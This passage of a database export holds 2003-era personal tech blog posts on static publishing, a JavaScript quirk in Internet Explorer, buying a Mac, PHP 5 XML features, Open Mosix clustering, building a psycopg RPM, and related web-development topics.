&lt;p&gt;In a static publishing system, &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; pages are pre-generated by the publishing software and stored as flat files on the web server, ready to be served. This approach is less flexible than dynamic generation in many ways and is often ignored as an option as a result, but in fact the vast majority of content sites consist of primarily static pages and could be powered by static content generation without any loss of functionality to the end user.&lt;/p&gt;

&lt;p&gt;The most widespread example of a static publishing system I've seen is &lt;a href=&quot;http://www.movabletype.org/&quot;&gt;Moveable Type&lt;/a&gt;, which rebuilds static files for a site each time a weblog entry is added or modified - although it can be configured to serve content dynamically instead.&lt;/p&gt;

&lt;p&gt;At first glance, the benefits of dynamic publishing are obvious. What is frequently ignored are the benefits of static publishing, at least for content-driven sites which don't have any heavy need for dynamic features. The most obvious benefit is performance; serving static files is what web servers such as Apache are optimised to do, and they can do it &lt;em&gt;fast&lt;/em&gt;. A second advantage is reliability, as Ian &lt;a href=&quot;http://blog.colorstudy.com/ianb/weblog/2003/12/12.html#P45&quot; title=&quot;CMS and static publishing&quot;&gt;explains&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://blog.colorstudy.com/ianb/weblog/2003/12/12.html#P45&quot;&gt;&lt;p&gt;A big part is that it takes the pressure off of going live. I can be sure before going live that the public website is correct. The actual CMS may explode in flames, but the site will be fine. Going live with a web application is always a stressful process, and anything that reduces the stress of that is a great benefit. As time goes on, static publishing is also a big stress reduction for the system administrator, since a simple Apache configuration is a lot more reliable under different loads and configurations than any dynamic site will be.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;I've been developing dynamic sites almost exclusively for the past two or three years, but a couple of my most recent projects were static rather than dynamic. These were the &lt;a href=&quot;http://coupons.lawrence.com/&quot;&gt;LJWorld.com Coupons site&lt;/a&gt; and the &lt;a href=&quot;http://www.kusports.com/multimedia/photogalleries/basketball/03-04/&quot; title=&quot;Men&amp;apos;s basketball 2003-04 season photo galleries&quot;&gt;KUSports.com photo galleries&lt;/a&gt;. I wanted to write both of these in Python, because doing so would make the process of transferring them over to our new mod_python powered &lt;acronym title=&quot;Content Management   System&quot;&gt;CMS&lt;/acronym&gt; (currently in development) far less involved. Unfortunately our main production servers don't currently have mod_python configured, and we weren't overly keen on setting it up there for the sake of a couple of small projects. Instead I decided to write the administration interfaces using Python &lt;acronym title=&quot;Common Gateway Interface&quot;&gt;CGI&lt;/acronym&gt; scripts, but generate the actual front end pages (which would see far heavier traffic) as static files.&lt;/p&gt;

&lt;p&gt;In addition to the performance and reliability benefits, an additional benefit is that static generation provides a simple &quot;staging area&quot; style feature for free. Both the coupons and the gallery interfaces allow users to make multiple changes to site content safe in the knowledge that none of the changes will become visible until the &quot;Publish Site&quot; button is selected. At first I was worried that this extra step could prove confusing, but in practise it allows our content producers to make changes in a safe environment, without fear of accidentally breaking the public site while they are working.&lt;/p&gt;

&lt;p&gt;Static content generation certainly isn't appropriate for every project, but for plain content sites sites that don't need dynamic features it's a much more viable option than many people think.&lt;/p&gt;</field>
		<field name="created">2003-12-13 01:10:55</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1308</field>
		<field name="title">New Python Computer Science text book</field>
		<field name="slug">pythonComputerScience</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.fbeedle.com/99-6.html&quot;&gt;Python Programming: An Introduction to Computer Science&lt;/a&gt; is a new Computer Science text book designed for use in introduction to programming classes, written by John Zelle, who's &lt;a href=&quot;http://mcsp.wartburg.edu/zelle/python/&quot;&gt;Teaching with Python&lt;/a&gt; page . Kirby Urner recently posted a mostly positive &lt;a href=&quot;http://mail.python.org/pipermail/edu-sig/2003-December/003347.html&quot; title=&quot;[Edu-sig] Re: Python Programming: An Introduction to Computer Science&quot;&gt;review of the book&lt;/a&gt; to the &lt;a href=&quot;http://www.python.org/sigs/edu-sig/&quot; title=&quot;EDU-SIG: Python in Education&quot;&gt;Python Edu-SIG&lt;/a&gt; mailing list, which sparked an &lt;a href=&quot;http://mail.python.org/pipermail/edu-sig/2003-December/003349.html&quot; title=&quot;Dave Reed&amp;apos;s reply&quot;&gt;interesting discussion&lt;/a&gt; about Python's place in the &lt;acronym title=&quot;Computer Science&quot;&gt;CS&lt;/acronym&gt; curriculum.&lt;/p&gt;

&lt;p&gt;Unsurprisingly, the one thing that isn't disputed on the Python Edu-SIG list is that Python is a superb first language for &lt;acronym title=&quot;Computer Science&quot;&gt;CS&lt;/acronym&gt; students. As &lt;a href=&quot;http://simon.incutio.com/archive/2003/07/22/bruceEckel&quot; title=&quot;Python Advocacy from Bruce Eckel&quot;&gt;I've mentioned before&lt;/a&gt;, I'm convinced that the reason so many of my fellow students seem to actively dislike programming is that they're introduction to it was via Java, a language that enforces a mentality of battling the compiler more than one of straight problem solving. Hopefully now that text books are beginning to appear Python will be considered more seriously by computer science departments around the world.&lt;/p&gt;</field>
		<field name="created">2003-12-13 01:38:11</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1309</field>
		<field name="title">Grouping table data by header</field>
		<field name="slug">grouping</field>
		<field name="body">&lt;p&gt;Andy's &lt;a href=&quot;http://blog.mooncalf.me.uk/archive/2003/12/01/Tables&quot; title=&quot;Tables&quot;&gt;latest Javascript experiment&lt;/a&gt; is over a week old now but I managed to miss it the first time round. It's an interesting twist on the &lt;a href=&quot;http://www.kryogenix.org/code/browser/sorttable/&quot; title=&quot;sorttable: Make all your tables sortable&quot;&gt;sortable tables&lt;/a&gt; idea, allowing table data to be grouped as well as sorted by dragging each table header on to a box at the top of the table. Unfortunately the grouping feature seems unstable in &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; but it works a treat in Firebird.&lt;/p&gt;</field>
		<field name="created">2003-12-13 01:42:40</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1310</field>
		<field name="title">Javascript debugging: IE Option gotcha</field>
		<field name="slug">ieGotcha</field>
		<field name="body">&lt;p&gt;I've been debugging Javascript today. I like Javascript as a language, but I doubt anyone would disagree that it's a horrible, horrible language to debug across multiple browsers. Firebird at least has good debugging support - I currently use the Javascript Console and Jesse Ruderman's &lt;a href=&quot;http://www.squarefree.com/bookmarklets/webdevel.html#shell&quot; title=&quot;More voodoo magic in a bookmarklet&quot;&gt;shell bookmarklet&lt;/a&gt; and I really need to learn to use &lt;a href=&quot;http://devedge.netscape.com/viewsource/2002/venkman/01/&quot;&gt;Venkman&lt;/a&gt; some day. If anyone knows a better way of debugging Javascript in &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; than relying on the lame popup box I'd love to hear about it.&lt;/p&gt;

&lt;p&gt;In any case, one bug that I successfully vanquished today involved the humble &lt;code class=&quot;html&quot;&gt;&amp;lt;option&amp;gt;&lt;/code&gt; element. My &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; looked something like this:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;html&quot;&gt;&amp;lt;select name=&quot;categories&quot; multiple=&quot;multiple&quot; id=&quot;catfrom&quot; size=&quot;20&quot;&amp;gt;
 &amp;lt;option&amp;gt;entertainment&amp;lt;/option&amp;gt;
 &amp;lt;option&amp;gt;movies&amp;lt;/option&amp;gt;
 &amp;lt;option&amp;gt;sports&amp;lt;/option&amp;gt;
 &amp;lt;option&amp;gt;news&amp;lt;/option&amp;gt;
&amp;lt;/select&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I was having all kinds of strange problems in &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt;, which I finally tracked down to the following gotcha: in &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt;, the value property of an Option object is empty if the corresponding option tag doesn't have a value attribute. This is counter-intuitive because in &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; if an option attribute is omitted the text inside the option element is used as the value instead. Mozilla browsers duplicate this in their handling of the Option object; &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; doesn't. Hopefully this tip will save someone some debugging time in the future.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Update:&lt;/strong&gt; David Lindquist pointed me to Microsoft's free &lt;a href=&quot;http://www.microsoft.com/downloads/details.aspx?familyid=2F465BE0-94FD-4569-B3C4-DFFDF19CCD99&amp;amp;displaylang=en&quot;&gt;Script Debugger&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-12-13 21:26:12</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1311</field>
		<field name="title">Mac buying advice needed</field>
		<field name="slug">macBuyingAdvice</field>
		<field name="body">&lt;p&gt;I'm in the market for a new laptop, and I'm almost 100% certain it's going to be a Mac. I'm going to be using it as my primary personal computing platform, but the vast majority of what I do with a computer is browsing, using email and messing around Python, Apache and other geeky toys. I'm sorely tempted by one of the 14&quot; iBooks. Since I'll be using this thing a lot (and I've never been a huge fan of laptop keyboards) 12 inches seems to small, and I'm not convinced that the extra cash for a PowerBook is worthwhile now that iBooks go up to 1 GHz.&lt;/p&gt;

&lt;p&gt;One major concern is that this is likely to be my only computer purchase for the next couple of years, and will likely be the machine that gets me through my final year of University. With this in mind, I'm not sure if shelling out the extra for a PowerBook is a better investment than I think it is.&lt;/p&gt;

&lt;p&gt;I'm hoping that a fair number of Mac users will read this, so here's a whole bunch of questions that have come up during my research:&lt;/p&gt;

&lt;ol&gt;
 &lt;li&gt;Buy from Apple, or buy from some other place like &lt;a href=&quot;http://www.macmall.com/&quot;&gt;MacMall&lt;/a&gt;? Is it worth shopping around for a good deal or does Apple fix the prices to the point that I may as well buy straight from them?&lt;/li&gt;
 &lt;li&gt;Will I really, really regret buying an iBook right now in a few weeks time? The &lt;a href=&quot;http://buyersguide.macrumors.com/&quot;&gt;Mac Rumours Buyer's Guide&lt;/a&gt; says &quot;Buy - Product recently updated&quot; as the iBook was last updated 54 days ago. I'm just worried that the price will go down significantly after Christmas.&lt;/li&gt;
 &lt;li&gt;RAM. I've been told that it's best to buy the lowest configuration system from Apple and upgrade the memory myself. If I do this, where are good places to buy compatible memory online?&lt;/li&gt;
 &lt;li&gt;Battery life: how long can I expect a standard iBook to last on battery? Is the expensive upgrade to add a second battery worth the investment?&lt;/li&gt;
 &lt;li&gt;Are there additional advantages to getting a PowerBook over an iBook that I haven't considered?&lt;/li&gt;
 &lt;li&gt;Finally, a question about &lt;a href=&quot;http://www.microsoft.com/mac/products/virtualpc/virtualpc.aspx&quot;&gt;Virtual PC&lt;/a&gt;. Now that Microsoft have bought it can I still use it to run Linux? I know it's possible to run most Linux software on OS X but I really like the idea of a sandboxed Linux install I can futz with without fear of destroying anything, especially since we use Linux heavily at work.&lt;/li&gt;
&lt;/ol&gt;</field>
		<field name="created">2003-12-16 00:43:29</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1312</field>
		<field name="title">Joel on Eric</field>
		<field name="slug">crazedAntiIdiotariansStillWrit</field>
		<field name="body">&lt;p&gt;Joel Spolsky's &lt;a href=&quot;http://www.joelonsoftware.com/articles/Biculturalism.html&quot; title=&quot;Biculturalism&quot;&gt;latest essay&lt;/a&gt; reviews Eric Raymond's &lt;a href=&quot;http://www.faqs.org/docs/artu/&quot;&gt;The Art of Unix Programming&lt;/a&gt; (a book I &lt;em&gt;really&lt;/em&gt; want to pick up) and uses it as background for a discussion of the cultural differences between Windows and Unix programmers. As always, it's an insightful piece.&lt;/p&gt;

&lt;p&gt;Joel's key point is that while Unix programmers write code for other programmers, Windows programmers write code for end users. Unix programs end up being far more powerful and flexible, but Windows programs allow Aunt Madge to send email. Joel places the blame for the lack of success of Linux as a desktop operating systems on the cultural values that underpin it, which celebrate the diversity of multiple window managers rather than condeming them for confusing end users.&lt;/p&gt;

&lt;p&gt;It's all good stuff. I'd argue that the rise of web-based applications balances the playing field somewhat in terms of ease of use of the different platforms - most people can handle a web application now (look at the success of webmail) and most browser behave in pretty much the same way no matter what operating system they run on. I guess that's why Microsoft were so scared of Netscape back in 1996.&lt;/p&gt;</field>
		<field name="created">2003-12-16 01:24:12</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1313</field>
		<field name="title">More CSS trickery</field>
		<field name="slug">trickery</field>
		<field name="body">&lt;p&gt;Stu Nicholls dropped me a line earlier to pimp his new &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; demo site, &lt;a href=&quot;http://www.s7u.co.uk/&quot;&gt;www.s7u.co.uk&lt;/a&gt;. He's got some really nice tricks and the site warrants serious exploration. There's a &lt;a href=&quot;http://www.s7u.co.uk/layouts/threecol.html&quot; title=&quot;The compulsory three column&quot;&gt;good take&lt;/a&gt; on the classic 3 column layout with header and footer problem, a bunch of neat &lt;a href=&quot;http://www.s7u.co.uk/menus/&quot; title=&quot;Sample CSS menus&quot;&gt;menus&lt;/a&gt; and a bunch of &lt;a href=&quot;http://www.s7u.co.uk/menu/&quot; title=&quot;A selection of CSS techniques&quot;&gt;fun demos&lt;/a&gt; that defy categorisation.&lt;/p&gt;</field>
		<field name="created">2003-12-16 01:31:44</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1314</field>
		<field name="title">RELAX NG now an ISO standard</field>
		<field name="slug">relaxNGStandard</field>
		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://www.steptwo.com.au/columntwo/archives/001029.html&quot; title=&quot;Column Two: RELAX NG now a full ISO International Standard&quot;&gt;James Robertson&lt;/a&gt;, RELAX NG (altogether too many caps) &lt;a href=&quot;http://xmlhack.com/read.php?item=2119&quot; title=&quot;RELAX NG now a full ISO International Standard&quot;&gt;has been published by ISO&lt;/a&gt; as an International Standard. RELAX NG compact syntax is will &lt;a href=&quot;http://relaxng.org/pipermail/relaxng-user/2003-December/000200.html&quot; title=&quot;[relaxng-user] Compact syntax ISO standardization&quot;&gt;hopefully join it soon&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;RELAX NG is the sane alternative to &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; Schema. It's a schema language which allows you to define the &quot;shape&quot; of a class of &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; documents - a bit like a &lt;acronym title=&quot;Document Type Definition&quot;&gt;DTD&lt;/acronym&gt; but far more flexible. The reason I like it is the &lt;a href=&quot;http://www.xml.com/pub/a/2002/06/19/rng-compact.html&quot; title=&quot;XML.com: RELAX NG&amp;apos;s Compact Syntax&quot;&gt;compact syntax&lt;/a&gt;, which lets you define schemas using a non-&lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; syntax similar in some ways to &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt;. This makes defining new types of &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; document far less unpleasant.&lt;/p&gt;</field>
		<field name="created">2003-12-16 03:41:03</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1315</field>
		<field name="title">Open Mosix</field>
		<field name="slug">openMosix</field>
		<field name="body">&lt;p&gt;I can't remember how I stumbled across it, but &lt;a href=&quot;http://openmosix.sourceforge.net/&quot;&gt;Open Mosix&lt;/a&gt; looks like a really interesting project. It's a Linux kernel extension that makes creating a Linux cluster is as simple as installing a kernel module on a number of machines and supplying each one with a shared config file.&lt;/p&gt;

&lt;p&gt;Once the cluster is set up, any of the machines on the network has the ability to farm long running processes out to a different box. The clustering only kicks in when a process is running in the background takes more than a few seconds to execute. Once that happens, Open Mosix checks the load averages on the machines in the cluster and, if a better host is found, migrates the process over to the other machine. The whole process is completely transparent; as far as the end user is concerned the processes they run just keep on running until they terminate.&lt;/p&gt;

&lt;p&gt;Since clustering only kicks off for longer running processes this woudn't be much use for something like a web server farm, but could be ideal for tasks such as compilation or rendering where individual processes perform computationally intensive work for a long period of time.&lt;/p&gt;

&lt;p&gt;Even more fascinating is &lt;a href=&quot;http://bofh.be/clusterknoppix/&quot;&gt;ClusterKnoppix&lt;/a&gt;, a modified Knoppix distro that uses an Open Mosix enabled kernel. Burn a bunch of CDs, boot some standard networked PCs with them and you've got an instant cluster.&lt;/p&gt;

&lt;p&gt;I've been doing some pretty intense log crunching today on a year's worth of daily web server logs, each one between 15 and 20 MB in size. Since most of the work is in running a regular expression on each line of each file it's likely a cluster would have speeded the whole thing up considerably. Unfortunately, I doubt my co-workers would have been overjoyed with me turning their machines in to cluster nodes for the day.&lt;/p&gt;</field>
		<field name="created">2003-12-19 23:44:04</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1316</field>
		<field name="title">Atom autodiscovery test suite</field>
		<field name="slug">testFu</field>
		<field name="body">&lt;p&gt;Mark Pilgrim has &lt;a href=&quot;http://diveintomark.org/archives/2003/12/20/autodiscovery-tests&quot; title=&quot;Atom autodiscovery conformance tests&quot;&gt;released&lt;/a&gt; the &lt;a href=&quot;http://diveintomark.org/tests/client/autodiscovery/&quot;&gt;Atom autodiscovery test suite&lt;/a&gt;, comprising 148 tests:&lt;/p&gt;

&lt;blockquote cite=&quot;http://diveintomark.org/archives/2003/12/20/autodiscovery-tests&quot;&gt;&lt;p&gt;When we say that Atom is going to have better specs, validators, and conformance tests than anything you've ever seen before, this is what we're talking about.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;Mark's &lt;a href=&quot;http://diveintomark.org/tests/client/autodiscovery/atomautodiscovery.py&quot;&gt;atomautodiscovery.py&lt;/a&gt; (based on Python's &lt;a href=&quot;http://www.python.org/doc/current/lib/module-sgmllib.html&quot; title=&quot;13.2 sgmllib - Simple SGML parser&quot;&gt;sgmllib&lt;/a&gt; module) passes all of the tests using a surprisingly small amount of actual code. The neatest thing about the test suite is that each test provides a &lt;code class=&quot;html&quot;&gt;&amp;lt;link rel=&quot;next&quot; ...&lt;/code&gt; attribute pointing to the next test in the suite. &lt;code&gt;atomautodiscovery.py&lt;/code&gt; uses these links in its &lt;code class=&quot;python&quot;&gt;test()&lt;/code&gt; function to run through every test in the suite, meaning that new tests can be added without modifying the test execution code.&lt;/p&gt;</field>
		<field name="created">2003-12-20 21:45:20</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1317</field>
		<field name="title">I've ordered my PowerBook</field>
		<field name="slug">anticipation</field>
		<field name="body">&lt;p&gt;Thanks to everyone who &lt;a href=&quot;http://simon.incutio.com/archive/2003/12/16/macBuyingAdvice#comments&quot; title=&quot;Comments on &amp;quot;Mac buying advice needed&amp;quot;&quot;&gt;provided advice&lt;/a&gt; on buying a Mac - it provide incredibly helpful in making my selection. I placed my order this afternoon for a 15&quot; 1 GHz PowerBook with a SuperDrive, backlit keyboard and 60 GB of Hard Disk space. I went with the minimum possible memory (256 MB) and plan to buy an extra 512 MB from &lt;a href=&quot;http://www.crucial.com/&quot;&gt;Crucial&lt;/a&gt; (for less than half the price Apple charge) in a few weeks time.&lt;/p&gt;

&lt;p&gt;I saved a serious chunk of money thanks to the &lt;a href=&quot;http://developer.apple.com/students/&quot;&gt;Student Developer program&lt;/a&gt; (&lt;a href=&quot;http://randomfoo.net/?p=2003_11_00_archive.inc&quot; title=&quot;random($foo)&quot;&gt;tip off&lt;/a&gt; from Leonard Lin), which for a $99 membership fee and proof of student status gives you up to 20% off your first hardware purchase from the Apple store. In total, I saved nearly a thousand pounds ($1500+) on the cost of the same machine in the UK. Truth be told, it was the amount I would save by buying here that inspired me to look at PowerBooks rather than iBooks in the first place.&lt;/p&gt;

&lt;p&gt;Delivery in 2-3 business days. I can hardly wait.&lt;/p&gt;</field>
		<field name="created">2003-12-20 23:31:40</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1318</field>
		<field name="title">XML highlights for PHP 5</field>
		<field name="slug">php5XMLHighlights</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://slides.bitflux.ch/phpconf2003/&quot;&gt;XML in PHP5: An in-depth look into advanced XML features&lt;/a&gt; (via &lt;a href=&quot;http://keithdevens.com/weblog/archive/2003/Dec/20/links&quot; title=&quot;Links&quot;&gt;Keith&lt;/a&gt;) does exactly what it says on the tin. Here are the bits that caught my eye:&lt;/p&gt;

&lt;ul&gt;
 &lt;li&gt;&lt;a href=&quot;http://slides.bitflux.ch/phpconf2003/slide_22.html&quot;&gt;HTML Support in ext/xml&lt;/a&gt; - PHP 5 can load in not well-formed HTML documents and create a DOM tree from them.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://slides.bitflux.ch/phpconf2003/slide_24.html&quot;&gt;XPath support&lt;/a&gt; - and it &lt;a href=&quot;http://slides.bitflux.ch/phpconf2003/slide_23.html&quot; title=&quot;HTML Example&quot;&gt;works with HTML&lt;/a&gt; loaded via the above.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://slides.bitflux.ch/phpconf2003/slide_26.html&quot;&gt;XML Validation&lt;/a&gt;, including support for RelaxNG! I wonder if they'll support compact syntax.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://slides.bitflux.ch/phpconf2003/slide_16.html&quot;&gt;Extending DOM Classes&lt;/a&gt; - this is really cool, and demonstrates how much more mature PHP 5's OOP support is.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Unforuntately, my biggest criticism of &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; remains: all of the above is supported using functions built in to the default namespace! The lack of a smart namespace system (like Python's modules) really gets in the way when you start trying to write reusable code or large applications.&lt;/p&gt;</field>
		<field name="created">2003-12-20 23:44:53</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1319</field>
		<field name="title">Nielsen watch 2003</field>
		<field name="slug">nielsen</field>
		<field name="body">&lt;p&gt;Jakob Nielsen's &lt;a href=&quot;http://www.useit.com/alertbox/20031222.html&quot;&gt;Top Ten Web Design Mistakes of 2003&lt;/a&gt; make interesting reading this year, covering topics including undated content, incomprehensible thumbnails and overly specific forms. In previous years Jakob's complaints tended to center around far more obvious problems such as horizontal scroll bars and fixed size fonts. Either the field of web usability has matured to the point where the common issues are less glaringly obvious or Jakob is running out of low-hanging fruit.&lt;/p&gt;</field>
		<field name="created">2003-12-23 03:05:29</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1320</field>
		<field name="title">A belated Merry Christmas</field>
		<field name="slug">belated</field>
		<field name="body">&lt;p&gt;I'm back to work after enjoying that most precious of things: a holiday without computers. Comment spam has been deleted, email spam has been saved in a special folder (for rapid training of bayesian classifiers in the future) and the few emails of actual importance have all been flagged for follow up. Oh, and my Mac's shipping date has slipped to the 2nd of January. If haven't received it by &lt;a href=&quot;http://www.macworldexpo.com/&quot;&gt;Macworld&lt;/a&gt; and Apple drop the price I'll be understandably upset.&lt;/p&gt;</field>
		<field name="created">2003-12-29 14:28:26</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1321</field>
		<field name="title">Javascript from Python</field>
		<field name="slug">seamonkey</field>
		<field name="body">&lt;p&gt;In a way I'm disappointed to see &lt;a href=&quot;http://wwwsearch.sourceforge.net/python-spidermonkey/&quot;&gt;python-spidermonkey&lt;/a&gt; released. It's a Python wrapper around the Mozilla project's &lt;a href=&quot;http://www.mozilla.org/js/spidermonkey/&quot;&gt;SpiderMonkey Javascript engine&lt;/a&gt; which allows Python scripts to execute Javascript code in a rock-solid, battle-tested embedded interpreter.&lt;/p&gt;

&lt;p&gt;Why the disappointment? Because just 5 days ago I decided that a Python wrapper for SpiderMonkey would be the ideal project for me to finally attempt to do something productive with C. John J. Lee evidently beat me to it. I can't complain though, as I was estimating a good six months to figure out how to get it all working.&lt;/p&gt;

&lt;p&gt;Pettiness aside, this looks like a really valuable project. In addition to being critical for such things as web based unit testing (John's &lt;a href=&quot;http://wwwsearch.sourceforge.net/DOMForm/&quot;&gt;DOMForm&lt;/a&gt; does exactly that) it may also provide a useful &quot;sandbox&quot; protected interpreted scripting language for Python projects. Python's own &lt;a href=&quot;http://www.python.org/doc/current/lib/module-rexec.html&quot;&gt;rexec module&lt;/a&gt; is meant to provide a safe sandbox for executing potentially hostile code but has been disabled due to potential vulnerabilities. The SeaMonkey Javascript interpreter is tried and tested in this capacity, at least in its incarnation within the Mozilla family of web browsers.&lt;/p&gt;</field>
		<field name="created">2003-12-29 23:47:46</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1322</field>
		<field name="title">Professional social software</field>
		<field name="slug">proSocialSoftware</field>
		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://www.7nights.com/asterisk/archives/linkedin_connections.php&quot;&gt;D. Keith Robinson&lt;/a&gt;, &lt;a href=&quot;https://www.linkedin.com/&quot;&gt;LinkedIn&lt;/a&gt; is a social software system that works kind of like &lt;a href=&quot;http://www.friendster.com/&quot;&gt;Friendster&lt;/a&gt; but is targetted at professionals. You sign up, create a profile that includes your industry and geographical area and it provides you with a number of tools to find other people with similar interests. More importantly, it lets you build up a network of contacts through which you can access other people. If nothing else, it's a great way of maintaining your CV.&lt;/p&gt;

&lt;p&gt;Keith says he's had a few leads for freelance work from it so it appears to work. I've created an account; if you sign up, drop me an invite (my email address can be found via my &lt;a href=&quot;http://simon.incutio.com/contact/&quot;&gt;contact page&lt;/a&gt;) and provided I have at least a vague inkling of who you are I'll add you to my immediate network.&lt;/p&gt;

&lt;p&gt;Incidentally, the most connected member is currently one &lt;a href=&quot;http://joi.ito.com/&quot;&gt;Joi Ito&lt;/a&gt; with 493 connections. I'm guessing LinkedIn follows &lt;a href=&quot;http://www.shirky.com/writings/powerlaw_weblog.html&quot; title=&quot;Power Laws, Weblogs, and Inequality&quot;&gt;power laws&lt;/a&gt; just as much as the rest of the web does.&lt;/p&gt;</field>
		<field name="created">2003-12-31 04:31:49</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1323</field>
		<field name="title">Installing psycopg on Red Hat 9</field>
		<field name="slug">psycopg</field>
		<field name="body">&lt;p&gt;Adrian Holovaty and I spent some time today figuring out how to get the &lt;a href=&quot;http://initd.org/software/psycopg/&quot;&gt;psycopg Postgres module&lt;/a&gt; to install on Red Hat 9. It took a while, but eventually we tweaked the spec file and used it to compile our own &lt;acronym title=&quot;Red Hat Package Manager&quot;&gt;RPM&lt;/acronym&gt;. I've posted our modified spec file &lt;a href=&quot;http://lists.initd.org/pipermail/psycopg/2003-December/002482.html&quot; title=&quot;[Psycopg] Updated spec file for Redhat 9&quot;&gt;to the psycopg mailing list&lt;/a&gt;. More for my own record than anything else, the arcane incantations needed to create the &lt;acronym title=&quot;Red Hat Package Manager&quot;&gt;RPM&lt;/acronym&gt; went roughly as follows:&lt;/p&gt;

&lt;ol&gt;
 &lt;li&gt;Copy the modified &lt;samp&gt;psycopg.spec&lt;/samp&gt; file in to &lt;samp&gt;/usr/src/redhat/SPECS/&lt;/samp&gt;&lt;/li&gt;
 &lt;li&gt;Copy &lt;samp&gt;psycopg-1.1.11.tar.gz&lt;/samp&gt; in to &lt;samp&gt;/usr/src/redhat/SOURCES&lt;/samp&gt;&lt;/li&gt;
 &lt;li&gt;In the SPECS directory, run &lt;samp&gt;rpmbuild -ba psycopg.spec&lt;/samp&gt;&lt;/li&gt;
 &lt;li&gt;Install the resulting &lt;acronym title=&quot;Red Hat Package Manager&quot;&gt;RPM&lt;/acronym&gt;, which materialised in &lt;samp&gt;/usr/src/redhat/RPMS&lt;/samp&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;The above was recreated by digging through my bash history - hopefully I haven't missed a step. The technique appears to work for Fedora as well.&lt;/p&gt;</field>
		<field name="created">2003-12-31 04:43:03</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1324</field>
		<field name="title">Happy New Year!</field>
		<field name="slug">happyNewYear</field>
		<field name="body">&lt;p&gt;Happy New Year to all my friends back in the UK. Of course, here in Kansas it's only 6pm. Gotta love those &lt;a href=&quot;http://c2.com/cgi/wiki?TimeZones&quot;&gt;time zones&lt;/a&gt; (&lt;q cite=&quot;http://c2.com/cgi/wiki?TimeZones&quot;&gt;Second worst idea ever. (See &lt;a href=&quot;http://c2.com/cgi/wiki?DaylightSavingTime&quot;&gt;DaylightSavingTime&lt;/a&gt;) A nightmare from which we can never escape. Think JetLag is bad? TimeZones are worse, because we all have it, and they won't go away after a few oddly timed naps.&lt;/q&gt;)&lt;/p&gt;</field>
		<field name="created">2004-01-01 00:00:05</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1325</field>
		<field name="title">Object relational mappings are over-rated...</field>
		<field name="slug">foodForThought</field>
		<field name="body">&lt;p&gt;... At least &lt;a href=&quot;http://tbray.org/ongoing/When/200x/2003/12/31/HeWantsEverything&quot; title=&quot;The Three-Legged Future&quot;&gt;according to Tim Bray&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://tbray.org/ongoing/When/200x/2003/12/31/HeWantsEverything&quot;&gt;&lt;p&gt;Lots of architects have learned, painfully, that you usually can't magick relational rows away behind object/class abstractions. The right way to think about a database is as a set of normalized tables that are designed to be addressed with SQL strings.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;This brings in to focus something I've been thinking about for quite a while. I always try to abstract away the details of the data storage layer behind some kind of interface, so that none of my front end code ever has to make a direct database call, instead calling methods on my application objects with names like &quot;get_user_by_id&quot; or &quot;get_blog_entries_for_date&quot;. The idea is that I could, if I wanted to, completely switch out the underlying data source. I should also be able to write new front-end functionality that calls the existing application layer methods without having to change anything in the data access code.&lt;/p&gt;

